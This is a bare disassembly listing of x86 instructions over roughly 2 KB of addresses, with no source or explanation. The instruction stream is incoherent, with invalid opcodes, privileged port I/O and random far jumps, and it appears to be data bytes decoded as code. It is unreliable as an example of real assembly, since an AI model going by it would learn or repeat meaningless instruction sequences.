  443cf7:	xchg   edi,eax
  443cf8:	cwde   
  443cf9:	inc    edx
  443cfa:	aad    0xe4
  443cfc:	sbb    dl,bl
  443cfe:	sbb    al,0x1
  443d00:	pop    eax
  443d01:	popa   
  443d02:	clc    
  443d03:	out    dx,al
  443d04:	xor    ch,BYTE PTR es:[eax-0x39]
  443d08:	test   eax,0x30141683
  443d0d:	gs pusha 
  443d0f:	fdivr  DWORD PTR [edi]
  443d11:	mov    WORD PTR [edi+0x2097606d],ds
  443d17:	adc    BYTE PTR [edi-0x34],bl
  443d1a:	shl    ebx,0xa3
  443d1d:	mov    WORD PTR [ebx],gs
  443d1f:	push   eax
  443d20:	fdiv   DWORD PTR [esi+0x4d024cce]
  443d26:	or     DWORD PTR [esp+esi*1+0x66],edx
  443d2a:	sbb    al,0x30
  443d2c:	pop    edx
  443d2d:	jmp    0x443d98
  443d2f:	into   
  443d30:	xor    al,0x78
  443d32:	add    al,0xdd
  443d34:	sbb    BYTE PTR [eax],bh
  443d36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443d37:	mov    ss:0xf891b2a8,eax
  443d3d:	or     al,0x87
  443d3f:	fist   DWORD PTR [ebx]
  443d41:	sub    BYTE PTR [esi+eax*8],ch
  443d44:	mov    ds:0xac3738d7,al
  443d49:	mov    ch,0x98
  443d4b:	push   edi
  443d4c:	(bad)  
  443d4d:	sub    edx,DWORD PTR [edx+0x2e]
  443d50:	dec    ebx
  443d51:	pushf  
  443d52:	call   0x46cd6083
  443d57:	inc    ebx
  443d58:	push   esi
  443d59:	sar    al,cl
  443d5b:	sbb    bh,BYTE PTR [eax+0x20]
  443d5e:	jecxz  0x443d90
  443d60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443d61:	push   cs
  443d62:	xor    DWORD PTR [edx-0x4a],esp
  443d65:	test   eax,0x6d505dbe
  443d6a:	inc    esi
  443d6b:	xor    DWORD PTR [ebx+0x0],0x884252eb
  443d72:	repz (bad) [esi-0x7b]
  443d76:	imul   sp,WORD PTR [ebp-0x620d3fa4],0xaf60
  443d7f:	mov    ch,0xc3
  443d81:	jb     0x443e01
  443d83:	popa   
  443d84:	das    
  443d85:	add    al,0xf9
  443d87:	shl    BYTE PTR [edx-0x6b193fae],0x8
  443d8e:	xor    al,0xb8
  443d90:	icebp  
  443d91:	mov    ah,0x17
  443d93:	add    al,0x3e
  443d95:	out    dx,al
  443d96:	sub    dh,BYTE PTR [ecx+0x5e784dce]
  443d9c:	mov    BYTE PTR [esi+0x40],bh
  443d9f:	cli    
  443da0:	add    DWORD PTR [edx-0x1c],edi
  443da3:	dec    edx
  443da4:	lods   al,BYTE PTR ds:[esi]
  443da5:	repnz test al,0x6f
  443da8:	(bad)  
  443daa:	xor    DWORD PTR [ebx+edx*8],ebx
  443dad:	ins    BYTE PTR es:[edi],dx
  443dae:	pop    edi
  443daf:	test   BYTE PTR [esi],bl
  443db1:	sbb    cl,bh
  443db3:	and    BYTE PTR [esi+0x6bfcb81c],dh
  443db9:	jb     0x443d45
  443dbb:	inc    ecx
  443dbc:	pusha  
  443dbd:	sub    edx,DWORD PTR [eax-0x1e]
  443dc0:	imul   sp,WORD PTR [eax-0x193dce69],0xff92
  443dc8:	push   ds
  443dc9:	cmp    BYTE PTR [ebx-0x219ee9b6],bh
  443dcf:	int    0x6d
  443dd1:	jecxz  0x443e2e
  443dd3:	inc    esi
  443dd4:	and    al,0xb4
  443dd6:	lods   al,BYTE PTR ds:[esi]
  443dd7:	xchg   ecx,eax
  443dd8:	(bad)  [ebp-0x6df47960]
  443dde:	push   eax
  443ddf:	push   eax
  443de0:	sub    DWORD PTR [esp+esi*4+0x76b676],ebp
  443de7:	add    edi,edx
  443de9:	push   es
  443dea:	pop    esi
  443deb:	pop    es
  443dec:	xchg   esp,eax
  443ded:	pop    edx
  443dee:	dec    ebx
  443def:	ins    DWORD PTR es:[edi],dx
  443df0:	int    0x8
  443df2:	leave  
  443df3:	loop   0x443e71
  443df5:	fs mov ecx,0x8b07ee3a
  443dfb:	mov    esi,0x4414144c
  443e00:	xchg   esi,eax
  443e01:	imul   ebp,DWORD PTR [esi-0x2a],0x4d
  443e05:	test   eax,0x2a5a63d9
  443e0a:	xchg   esp,eax
  443e0b:	adc    BYTE PTR [eax+0x5fb0e8e2],ah
  443e11:	xor    dh,BYTE PTR [eax+0x3ef1ed0a]
  443e17:	aad    0xc
  443e19:	add    al,0x4a
  443e1b:	clc    
  443e1c:	or     eax,0x7354b4ec
  443e21:	inc    esp
  443e22:	mov    edx,0x4fb4664
  443e27:	pop    esi
  443e28:	int3   
  443e29:	retf   
  443e2a:	inc    edx
  443e2b:	mov    ch,BYTE PTR [ebx-0x18]
  443e2e:	adc    BYTE PTR ss:[eax-0x7d],dl
  443e32:	retf   0x7454
  443e35:	dec    ebp
  443e36:	(bad)  
  443e37:	shr    BYTE PTR [edx-0x65],0xd2
  443e3b:	jbe    0x443e3b
  443e3d:	(bad)  
  443e3e:	call   0x3a2:0xa6ab2dd
  443e45:	mov    BYTE PTR [edi],ah
  443e47:	mov    dl,0xdc
  443e49:	jle    0x443e0d
  443e4b:	sub    ebx,DWORD PTR [edx]
  443e4d:	test   DWORD PTR [edx+eiz*4],esp
  443e50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443e51:	sbb    ecx,DWORD PTR [esi+0x1]
  443e54:	cmc    
  443e55:	dec    esp
  443e56:	cmp    eax,0xdcb805f0
  443e5b:	int3   
  443e5c:	push   esi
  443e5d:	add    DWORD PTR [esi+0x19],ebx
  443e60:	inc    eax
  443e61:	call   0x17a98594
  443e66:	inc    esp
  443e67:	cmp    al,0x82
  443e69:	mov    ah,0x74
  443e6b:	cmp    esp,esp
  443e6d:	push   esp
  443e6e:	aad    0x30
  443e70:	lock fstp TBYTE PTR [edx+0x74]
  443e74:	sbb    edx,edx
  443e76:	and    bl,0xc5
  443e79:	loope  0x443e32
  443e7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443e7c:	xchg   edi,eax
  443e7d:	pushf  
  443e7e:	jo     0x443e40
  443e80:	fcomp  st(2)
  443e82:	or     BYTE PTR [esi+0x4a3d28aa],dl
  443e88:	stc    
  443e89:	push   0xac1421c9
  443e8e:	cmp    BYTE PTR [esi-0x37],bh
  443e91:	sub    edi,DWORD PTR cs:[edx+ebx*2-0x4b]
  443e96:	ror    BYTE PTR [ebx],0x4b
  443e99:	das    
  443e9a:	sar    bh,1
  443e9c:	call   0x3eca:0xa22ae992
  443ea3:	push   ecx
  443ea4:	bound  esi,QWORD PTR [edi+0x5e]
  443ea7:	push   ss
  443ea8:	mov    cl,BYTE PTR [edx]
  443eaa:	jo     0x443efd
  443eac:	adc    BYTE PTR [edx-0x747d6b4],ch
  443eb2:	bound  eax,QWORD PTR [eax-0x53]
  443eb5:	test   al,0x6a
  443eb7:	in     eax,dx
  443eb8:	push   edx
  443eb9:	iret   
  443eba:	ins    BYTE PTR es:[edi],dx
  443ebb:	bound  ebx,QWORD PTR [eax+0x60]
  443ebe:	fsub   DWORD PTR [ecx-0x72]
  443ec1:	and    ecx,DWORD PTR [esp+esi*2-0x34]
  443ec5:	mov    dl,0x25
  443ec7:	pop    ecx
  443ec8:	pop    ebp
  443ec9:	test   BYTE PTR [ecx],0x42
  443ecc:	pop    eax
  443ecd:	test   ah,al
  443ecf:	into   
  443ed0:	fiadd  WORD PTR [edi+0x8]
  443ed3:	int    0x84
  443ed5:	out    0x56,al
  443ed7:	hlt    
  443ed8:	cmp    BYTE PTR [edi-0x315fbc4f],ah
  443ede:	nop
  443edf:	jb     0x443e7e
  443ee1:	add    DWORD PTR [edx-0x80],esi
  443ee4:	rol    BYTE PTR [eax-0x29],0xb1
  443ee8:	repnz aaa 
  443eea:	test   ah,0x20
  443eed:	mov    edx,0x36a4f8dc
  443ef2:	pop    esi
  443ef3:	jle    0x443e85
  443ef5:	pop    eax
  443ef6:	ror    BYTE PTR [eax-0x3bdf63d1],1
  443efc:	stos   BYTE PTR es:[edi],al
  443efd:	repnz ds push 0x2a0a27ea
  443f04:	jg     0x443eb0
  443f06:	push   cs
  443f07:	push   es
  443f08:	cmp    al,0x10
  443f0a:	shl    dh,0x2a
  443f0d:	(bad)  [edx-0x37297f36]
  443f13:	xor    BYTE PTR [ebx+0x4d],dl
  443f16:	or     al,0x44
  443f18:	or     bh,bl
  443f1a:	retf   0x5565
  443f1d:	pop    edx
  443f1e:	test   al,0xbe
  443f20:	in     al,0x70
  443f22:	addr16 aam 0x3
  443f25:	adc    DWORD PTR [edi-0x7baac272],ecx
  443f2b:	iret   
  443f2c:	sbb    dl,ch
  443f2e:	xchg   DWORD PTR [eax+0x9016807],eax
  443f34:	jp     0x443f9d
  443f36:	pushf  
  443f37:	test   eax,0x35555042
  443f3c:	test   BYTE PTR [ecx-0x8],ch
  443f3f:	mov    ch,0x7d
  443f41:	pop    edx
  443f42:	shl    BYTE PTR [ebx],0xa4
  443f45:	mov    dl,0x6b
  443f47:	loop   0x443f9a
  443f49:	imul   eax,ebx,0x33
  443f4c:	mov    cl,0x70
  443f4e:	imul   edi,DWORD PTR [ebx+0x230ed2ec],0xffffffa2
  443f55:	imul   edx,DWORD PTR [eax],0xfffffff8
  443f58:	and    DWORD PTR [ebx+ebx*1-0x1d],ecx
  443f5c:	test   al,0xf4
  443f5e:	mov    esp,eax
  443f60:	mov    ds:0xe145ce80,al
  443f65:	cmp    al,0x2f
  443f67:	inc    ecx
  443f68:	clc    
  443f69:	or     ecx,esp
  443f6b:	and    DWORD PTR [esi],0xffffffce
  443f6e:	punpcklbw mm7,DWORD PTR [edx]
  443f71:	mov    WORD PTR [edi-0x3fbca1fc],ss
  443f77:	jge    0x443fa1
  443f79:	fidivr WORD PTR [edi+0x9]
  443f7c:	cld    
  443f7d:	add    BYTE PTR [eax+0x4f376260],0x69
  443f84:	ins    DWORD PTR es:[edi],dx
  443f85:	lds    eax,FWORD PTR [edi]
  443f87:	push   es
  443f88:	bswap  edx
  443f8a:	adc    DWORD PTR [ecx+0x49527ed0],ecx
  443f90:	xchg   edx,eax
  443f91:	fisub  DWORD PTR [eax]
  443f93:	adc    BYTE PTR [edx],0x68
  443f96:	mov    cl,0x3f
  443f98:	cmc    
  443f99:	push   ecx
  443f9a:	add    al,0x7e
  443f9c:	je     0x444013
  443f9e:	dec    ebx
  443f9f:	add    al,0x12
  443fa1:	fsubr  QWORD PTR [eax+0x30]
  443fa4:	sti    
  443fa5:	and    al,BYTE PTR [eax]
  443fa7:	ja     0x443f85
  443fa9:	sub    al,0xec
  443fab:	push   ecx
  443fac:	fld    DWORD PTR [esi+0x6f301a27]
  443fb2:	push   cs
  443fb3:	loope  0x443f7e
  443fb5:	add    al,0x26
  443fb7:	cmp    al,BYTE PTR ds:0x8c184635
  443fbd:	imul   ebp,DWORD PTR [eax],0x61
  443fc0:	inc    ecx
  443fc1:	cmp    ebp,DWORD PTR [eax+0x66c5ac78]
  443fc7:	cmc    
  443fc8:	mov    BYTE PTR [ecx+esi*4-0x1bb90be7],0x62
  443fd0:	xchg   esp,eax
  443fd1:	pop    es
  443fd2:	dec    eax
  443fd3:	stos   BYTE PTR es:[edi],al
  443fd4:	pop    ebx
  443fd5:	sub    bh,BYTE PTR [eax]
  443fd7:	mov    dh,ah
  443fd9:	js     0x444033
  443fdb:	add    BYTE PTR [eax],bh
  443fdd:	fbld   TBYTE PTR [eax]
  443fdf:	cli    
  443fe0:	add    BYTE PTR [ebx+ecx*1+0x92c7aa9],ah
  443fe7:	enter  0xa100,0x97
  443feb:	mov    ah,0x36
  443fed:	adc    DWORD PTR [eax+eiz*4],0x604c7624
  443ff4:	mov    eax,ds:0x1207b344
  443ff9:	sbb    ebp,esp
  443ffb:	rol    BYTE PTR [edi+eax*1],1
  443ffe:	int3   
  443fff:	and    BYTE PTR ds:0x11f456d4,ah
  444005:	push   edx
  444006:	sub    al,0x7a
  444008:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444009:	test   BYTE PTR [esi],bh
  44400b:	sub    al,0xfc
  44400d:	les    edx,FWORD PTR [ebp-0x582ed9a8]
  444013:	test   dh,dl
  444015:	mov    eax,ds:0xa0537e30
  44401a:	mov    edi,0x8ec154b0
  44401f:	and    al,dl
  444021:	sub    eax,0xd2274f2a
  444026:	test   BYTE PTR ds:0x680614ad,0xde
  44402d:	or     ecx,ebp
  44402f:	sub    ebx,DWORD PTR [edx+0x392af54]
  444035:	shl    esi,cl
  444037:	xor    BYTE PTR ds:0x6e78b9ee,0xd9
  44403e:	outs   dx,DWORD PTR ds:[esi]
  44403f:	inc    eax
  444040:	ficom  DWORD PTR [eax]
  444042:	xlat   BYTE PTR ds:[ebx]
  444043:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444044:	push   es
  444045:	ins    BYTE PTR es:[edi],dx
  444046:	loope  0x443fff
  444048:	test   DWORD PTR [edi-0x26],edi
  44404b:	(bad)  
  44404c:	mov    ecx,0x70902a5a
  444051:	clc    
  444052:	sub    ebx,DWORD PTR [eax+0x18]
  444055:	adc    BYTE PTR [edx+0xb807c65],bl
  44405b:	sub    ch,0x84
  44405e:	adc    eax,0xd45e5f55
  444063:	jb     0x443ffe
  444065:	mov    eax,0x6ca0911a
  44406a:	shl    DWORD PTR [edi+0x5414154c],1
  444070:	push   ebp
  444071:	mov    al,ds:0xca64500
  444076:	ret    0x5e50
  444079:	and    eax,0xaa4b8c81
  44407e:	adc    al,0x26
  444080:	or     edx,edx
  444082:	or     dh,BYTE PTR [ebx+0x7c0582a8]
  444088:	lea    ebx,[edi]
  44408a:	xor    al,dh
  44408c:	ror    BYTE PTR [ebx-0x17014daa],0x2b
  444093:	(bad)  
  444094:	lds    esp,FWORD PTR [ebx]
  444096:	fs ins BYTE PTR es:[edi],dx
  444098:	mov    esi,0xb418b2e8
  44409d:	test   BYTE PTR [edx],al
  44409f:	rcr    DWORD PTR [edx-0x7],cl
  4440a2:	dec    esp
  4440a3:	adc    dh,BYTE PTR [eax-0x4a]
  4440a6:	xor    BYTE PTR [edx-0x678a68ca],al
  4440ac:	push   esp
  4440ad:	dec    ecx
  4440ae:	lahf   
  4440af:	imul   ebp,DWORD PTR [eax+edx*1+0x13],0x99dc6c8
  4440b7:	xor    al,0xa3
  4440b9:	test   eax,0x5ae1c06f
  4440be:	or     bl,BYTE PTR [esi+esi*2+0x74]
  4440c2:	sub    BYTE PTR [ebp+0x1e],cl
  4440c5:	pop    di
  4440c7:	adc    ah,BYTE PTR [esi+edx*8-0x7ff8925e]
  4440ce:	sahf   
  4440cf:	pop    ds
  4440d0:	pop    esi
  4440d1:	mov    edi,?
  4440d3:	push   0x22
  4440d5:	aad    0x50
  4440d7:	jo     0x444142
  4440d9:	mov    BYTE PTR [esi],0x3c
  4440dc:	cmp    eax,0xd08a0f20
  4440e1:	and    dl,BYTE PTR [ebx]
  4440e3:	ficom  WORD PTR [edx+0x1830a93e]
  4440e9:	cs jmp 0x2ebe9fcd
  4440ef:	and    al,0x6b
  4440f1:	xchg   ebx,eax
  4440f2:	fwait
  4440f3:	pop    edx
  4440f4:	(bad)  
  4440f5:	jae    0x44407a
  4440f7:	sbb    ah,BYTE PTR [esi+esi*4-0x902250b]
  4440fe:	outs   dx,BYTE PTR ds:[esi]
  4440ff:	push   edx
  444100:	inc    edx
  444101:	add    edx,edi
  444103:	xor    dl,cl
  444105:	push   esi
  444106:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444107:	or     esi,edx
  444109:	adc    eax,DWORD PTR [ecx-0x7d1973c8]
  44410f:	add    BYTE PTR [ebp-0x79],ch
  444112:	and    al,0x6
  444114:	lock pusha 
  444116:	mov    dl,0xa6
  444118:	les    edi,FWORD PTR ds:0x7c04d859
  44411e:	push   ss
  44411f:	js     0x44413f
  444121:	sar    BYTE PTR [ebp+0xf],0x22
  444125:	sub    ch,BYTE PTR [eax]
  444127:	xchg   esi,eax
  444128:	lahf   
  444129:	ds mov ecx,0x8da5d258
  44412f:	add    DWORD PTR [eax+ecx*1],edx
  444132:	cs sti 
  444134:	inc    esp
  444135:	stos   BYTE PTR es:[edi],al
  444136:	test   BYTE PTR [esp+edx*1],dl
  444139:	(bad)  
  44413a:	dec    esp
  44413b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44413c:	xchg   edx,eax
  44413d:	rcl    BYTE PTR [esi-0x69],1
  444140:	mov    DWORD PTR [ebp+0x3c],edx
  444143:	push   ecx
  444144:	push   eax
  444145:	or     BYTE PTR [esi+0x3cc84ee0],dh
  44414b:	pop    ebx
  44414c:	mov    BYTE PTR [esi-0x62],bl
  44414f:	sub    DWORD PTR [eax+0x33],ebp
  444152:	or     ebp,DWORD PTR [edx+0x5e]
  444155:	mov    eax,ds:0x42527d88
  44415a:	sti    
  44415b:	aam    0x7f
  44415d:	clc    
  44415e:	(bad)  
  44415f:	fwait
  444160:	sub    BYTE PTR [esi+0x38],ch
  444163:	and    dl,BYTE PTR [esi]
  444165:	push   ebp
  444166:	lock xchg edx,eax
  444168:	aam    0xcc
  44416a:	mov    ch,0xb0
  44416c:	ins    DWORD PTR es:[edi],dx
  44416d:	mov    esp,cr5
  444170:	push   0x8da2ad9e
  444175:	fistp  DWORD PTR [edx]
  444177:	mov    gs,WORD PTR [ecx+0x29]
  44417a:	test   DWORD PTR [edi],esp
  44417c:	pop    ebx
  44417d:	add    BYTE PTR [ebp-0x756d872e],al
  444183:	sub    eax,esp
  444185:	mov    edi,0x442e2976
  44418a:	ins    BYTE PTR es:[edi],dx
  44418b:	test   al,0x3a
  44418d:	mov    cl,0x2
  44418f:	cdq    
  444190:	pop    esi
  444191:	out    dx,al
  444192:	sbb    BYTE PTR [eax+0x42],bl
  444195:	xor    ecx,DWORD PTR [ebx]
  444197:	push   ds
  444198:	pop    edx
  444199:	mov    bl,0xa
  44419b:	fs inc eax
  44419d:	fisttp DWORD PTR [eax+eax*4-0x2ae91342]
  4441a4:	nop
  4441a5:	sbb    BYTE PTR [edi-0x13],0x93
  4441a9:	lock mov al,bl
  4441ac:	jmp    0x145e:0x9cb2aa71
  4441b3:	sbb    bh,BYTE PTR [eax+0xd]
  4441b6:	or     esi,eax
  4441b8:	xchg   esi,eax
  4441b9:	xor    al,0xe9
  4441bb:	call   0x560e:0x159a2fd4
  4441c2:	xor    edi,eax
  4441c4:	add    al,0xd1
  4441c6:	popa   
  4441c7:	ror    BYTE PTR [edi+0x2],1
  4441ca:	addr16 je 0x4441ee
  4441cd:	push   ss
  4441ce:	mov    cl,0xb2
  4441d0:	jle    0x4441f4
  4441d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4441d3:	sub    al,0x94
  4441d5:	xor    al,0x96
  4441d7:	ins    BYTE PTR es:[edi],dx
  4441d8:	mov    esi,0xd76a40ca
  4441dd:	pop    ss
  4441de:	add    eax,0x41bc2842
  4441e3:	jmp    0x5571:0x1a0453eb
  4441ea:	in     al,dx
  4441eb:	shl    DWORD PTR [edi+0x226e1da4],1
  4441f1:	scas   al,BYTE PTR es:[edi]
  4441f2:	cmp    DWORD PTR [edx+edi*4-0x3f33294a],edx
  4441f9:	sti    
  4441fa:	jl     0x4441cc
  4441fc:	fld    st(4)
  4441fe:	sahf   
  4441ff:	or     dh,BYTE PTR [ebx]
  444201:	mov    edx,0xd0908f5a
  444206:	pop    eax
  444207:	mov    bh,0xe6
  444209:	jle    0x444257
  44420b:	sub    eax,0x93a85470
  444210:	xchg   esi,eax
  444211:	fimul  WORD PTR [edx+ecx*4]
  444214:	sti    
  444215:	ins    DWORD PTR es:[edi],dx
  444216:	add    bh,BYTE PTR [edi+0x1a08c1f8]
  44421c:	rcl    BYTE PTR [ebx+0x3a],cl
  44421f:	xor    esi,0x7296468b
  444225:	xchg   ecx,eax
  444226:	push   ecx
  444227:	push   0xffffffae
  444229:	xchg   edi,eax
  44422a:	add    eax,0xafd0a23c
  44422f:	dec    edx
  444230:	pop    esp
  444231:	sub    eax,0x7ed542ab
  444236:	or     al,0x4
  444238:	dec    esp
  444239:	jmp    0xd04877f6
  44423e:	mov    edx,0x2470323a
  444243:	call   0xde62:0x4381449d
  44424a:	in     al,0x59
  44424c:	inc    esi
  44424d:	mov    al,ds:0x525db0b0
  444252:	(bad)  
  444253:	stos   BYTE PTR es:[edi],al
  444254:	retf   0x7fd2
  444257:	prefetch BYTE PTR [edi+ecx*4+0x66]
  44425c:	(bad)  
  44425d:	hlt    
  44425e:	rcl    BYTE PTR [ebx],0x88
  444261:	pop    ds
  444262:	mov    ah,0x2
  444264:	sub    edx,DWORD PTR [esi]
  444266:	add    al,0x96
  444268:	pop    eax
  444269:	in     eax,dx
  44426a:	mov    esi,0x99e14ea8
  44426f:	les    ebx,FWORD PTR ds:0xb0f7e2d2
  444275:	add    eax,0x3aa411c6
  44427a:	pushf  
  44427b:	daa    
  44427c:	push   esi
  44427d:	push   esi
  44427e:	cmp    BYTE PTR [esi+ebx*1-0x7237aa00],dh
  444285:	and    BYTE PTR [eax-0x14],bh
  444288:	xor    dh,BYTE PTR [edx+ecx*2]
  44428b:	cmp    bh,ah
  44428d:	loopne 0x444233
  44428f:	xchg   eax,esi
  444291:	adc    DWORD PTR [ebx],ebx
  444293:	ds sub dh,bl
  444296:	inc    ebp
  444297:	enter  0xf9dc,0x6a
  44429b:	jnp    0x444263
  44429d:	stos   BYTE PTR es:[di],al
  44429f:	push   esp
  4442a0:	or     dh,bl
  4442a2:	popa   
  4442a3:	sub    BYTE PTR [ecx],dl
  4442a5:	or     ebx,DWORD PTR es:[eax]
  4442a8:	clc    
  4442a9:	dec    ecx
  4442aa:	aam    0xc8
  4442ac:	adc    eax,0x388b15e6
  4442b1:	aam    0x1b
  4442b3:	inc    edx
  4442b4:	cs xchg ebp,eax
  4442b6:	push   es
  4442b7:	sahf   
  4442b8:	xor    ebp,edx
  4442ba:	mov    esi,0x884ca644
  4442bf:	push   ebx
  4442c0:	add    dh,BYTE PTR [eax]
  4442c2:	rol    DWORD PTR [ebp-0x27299dde],1
  4442c8:	cwde   
  4442c9:	sbb    BYTE PTR [ebp+0x2b],ch
  4442cc:	clc    
  4442cd:	push   0xffffff80
  4442cf:	mov    ah,0x50
  4442d1:	retf   0xe9bc
  4442d4:	jo     0x4442c3
  4442d6:	lock or edx,DWORD PTR [esi+ebx*1]
  4442da:	sahf   
  4442db:	and    BYTE PTR [ebx+0xfb8d748],al
  4442e1:	dec    ebp
  4442e2:	mov    ebp,0xca494426
  4442e7:	xor    dl,0xa7
  4442ea:	xor    al,0xb6
  4442ec:	sub    eax,DWORD PTR [ebx]
  4442ee:	pop    edx
  4442ef:	dec    edx
  4442f0:	sbb    al,0x1a
  4442f2:	jne    0x444326
  4442f4:	push   esp
  4442f5:	push   ebx
  4442f6:	(bad)  
  4442f7:	mov    eax,0x98299c0b
  4442fc:	outs   dx,BYTE PTR ds:[esi]
  4442fd:	adc    ebp,ecx
  4442ff:	sub    al,0x92
  444301:	out    dx,eax
  444302:	aad    0xfa
  444304:	xchg   ebp,eax
  444305:	js     0x44434a
  444307:	shl    DWORD PTR [edi],cl
  444309:	lods   eax,DWORD PTR ds:[esi]
  44430a:	push   ss
  44430b:	or     dl,BYTE PTR [esi]
  44430d:	mov    edx,0xd4527a7b
  444312:	dec    ebx
  444313:	arpl   WORD PTR [edi],cx
  444315:	imul   ebx,DWORD PTR [edx+0x42b143e6],0x2c
  44431c:	loopne 0x4442b8
  44431e:	push   es
  44431f:	aam    0x70
  444321:	ins    DWORD PTR es:[edi],dx
  444322:	fwait
  444323:	and    DWORD PTR [ebp+edi*8-0x5c],edx
  444327:	dec    edx
  444328:	xchg   BYTE PTR [ebp+0x5b961c7e],bh
  44432e:	ret    0x4ab3
  444331:	out    dx,al
  444332:	dec    esp
  444333:	fwait
  444334:	inc    ecx
  444335:	or     BYTE PTR [edx+0xc345830],0x6e
  44433c:	fstp   DWORD PTR [eax+edx*4+0x4c]
  444340:	cmp    al,BYTE PTR [esi+ebx*2+0x4430dbe7]
  444347:	xor    al,0xac
  444349:	and    eax,0xa00c04c
  44434e:	or     ecx,DWORD PTR [edx+edi*8+0x60]
  444352:	aaa    
  444353:	cli    
  444354:	out    0x10,al
  444356:	shl    BYTE PTR [ebp+0x5e],1
  444359:	push   esp
  44435a:	out    0x5a,al
  44435c:	outs   dx,BYTE PTR ds:[esi]
  44435d:	mov    dl,0x59
  44435f:	inc    esp
  444360:	xor    eax,DWORD PTR [eax-0x25cf2b92]
  444366:	and    DWORD PTR [esi+esi*8-0x2f1e0856],ecx
  44436d:	in     eax,dx
  44436e:	les    ebx,FWORD PTR [edi]
  444370:	rcl    BYTE PTR [ebx-0x65],1
  444373:	fiadd  DWORD PTR [ecx+0x0]
  444376:	arpl   WORD PTR [ebx-0x295e8fc5],cx
  44437c:	push   ds
  44437d:	sub    dh,dh
  44437f:	sti    
  444380:	mov    esi,0x10e60a54
  444385:	and    bl,cl
  444387:	pop    edx
  444388:	sub    eax,DWORD PTR [edx]
  44438a:	mov    al,0x89
  44438c:	add    al,0xd
  44438e:	xchg   esp,eax
  44438f:	add    DWORD PTR [esp+esi*4],ebx
  444392:	push   ebp
  444393:	and    BYTE PTR [edx-0x4521436e],ah
  444399:	inc    ebx
  44439a:	js     0x44439c
  44439c:	mov    esp,0xb6222988
  4443a1:	stos   BYTE PTR es:[edi],al
  4443a2:	nop
  4443a3:	inc    eax
  4443a4:	mov    DWORD PTR gs:[esi],edi
  4443a7:	and    cl,BYTE PTR ds:0x80be329a
  4443ad:	outs   dx,BYTE PTR ds:[esi]
  4443ae:	ror    BYTE PTR [ecx],0x70
  4443b1:	repnz mov DWORD PTR [eax-0x7f6a389d],0x2e4c125e
  4443bc:	cmp    al,0x50
  4443be:	or     esi,DWORD PTR [edx-0x7e]
  4443c1:	mov    ah,BYTE PTR [esp+esi*2+0x5a5a1083]
  4443c8:	pop    esi
  4443c9:	(bad)  
  4443ca:	outs   dx,DWORD PTR ds:[esi]
  4443cb:	loop   0x44437e
  4443cd:	or     BYTE PTR [edx+0x153c8923],dh
  4443d3:	test   BYTE PTR [ebx-0x3bc7a12c],0x33
  4443da:	inc    esi
  4443db:	mov    eax,0xc40c76be
  4443e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4443e1:	adc    BYTE PTR [eax-0x1c],0xfa
  4443e5:	enter  0x7a1,0x46
  4443e9:	mov    eax,ds:0x45c8ce04
  4443ee:	add    BYTE PTR [edi],ah
  4443f0:	inc    eax
  4443f1:	fdivr  DWORD PTR [esi]
  4443f3:	aam    0x3e
  4443f5:	fs cmp dl,bl
  4443f8:	cli    
  4443f9:	xchg   DWORD PTR [edx+0x4ed8a40a],esi
  4443ff:	and    esi,DWORD PTR [esi+0x4b4a05f5]
  444405:	add    eax,0xf606dc84
  44440a:	jmp    0xa5682d92
  44440f:	in     al,dx
  444410:	outs   dx,BYTE PTR ds:[esi]
  444411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444412:	mov    ds:0xfb349e34,al
  444417:	inc    ebp
  444418:	imul   ebp,DWORD PTR [ecx-0x726625da],0xffffffbe
  44441f:	retf   0xb4c9
  444422:	pop    ss
  444423:	xor    al,0x56
  444425:	push   0xfffffff3
  444427:	xor    eax,0x5efad0ec
  44442c:	mov    al,0x84
  44442e:	out    0x6d,al
  444430:	xor    esp,eax
  444432:	add    al,0xb
  444434:	je     0x444440
  444436:	add    al,0x0
  444438:	jae    0x44443d
  44443a:	xchg   edx,esp
  44443c:	or     ebx,eax
  44443e:	sahf   
  44443f:	loopne 0x4443f9
  444441:	mov    ss,esp
  444443:	push   ebx
  444444:	add    al,0x38
  444446:	adc    ecx,DWORD PTR [ebp+0x5]
  444449:	es cs cmp al,0x8e
  44444d:	inc    eax
  44444e:	retf   0x2eda
  444451:	mov    WORD PTR [esi-0x1c],fs
  444454:	adc    eax,0x71eecf8a
  444459:	pop    ebp
  44445a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44445b:	push   esi
  44445c:	sbb    al,0x9
  44445e:	and    al,0x88
  444460:	xlat   BYTE PTR cs:[ebx]
  444462:	jmp    0x4443f8
  444464:	push   ds
  444465:	or     al,0xfd
  444467:	mov    ah,0xe3
  444469:	jbe    0x444447
  44446b:	inc    edi
  44446c:	test   dl,0xc2
  44446f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444470:	loopne 0x44440c
  444472:	dec    eax
  444473:	ret    0x7ef6
  444476:	jo     0x44442a
  444478:	mov    al,ds:0x4b8191d4
  44447d:	cmp    BYTE PTR [edi],ah
  44447f:	push   esi
  444480:	xchg   DWORD PTR [edx+0x70e08026],eax
  444486:	inc    ebx
  444487:	mov    ds:0x38d0688b,al
  44448c:	mov    al,ds:0xb65e4c85
  444491:	pusha  
  444492:	inc    ebx
  444493:	stos   DWORD PTR es:[edi],eax
  444494:	xor    al,BYTE PTR [edx+0xc]
  444497:	add    ecx,edx
  444499:	xchg   dh,cl
  44449b:	test   al,0x3a
  44449d:	push   ecx
  44449e:	push   eax
  44449f:	mov    DWORD PTR [ebx+0x7a],esp
  4444a2:	mov    ch,0x5a
  4444a4:	pop    ecx
  4444a5:	int3   
  4444a6:	inc    eax
  4444a7:	pop    es
  4444a8:	and    DWORD PTR [esi+eax*4-0x2c],edi
  4444ac:	xchg   edi,eax
  4444ad:	sbb    eax,0x42dc9a52
  4444b2:	aad    0x10
  4444b4:	add    BYTE PTR [ebx-0x99ba71e],ah
  4444ba:	imul   ecx,DWORD PTR [edx],0xe23268b
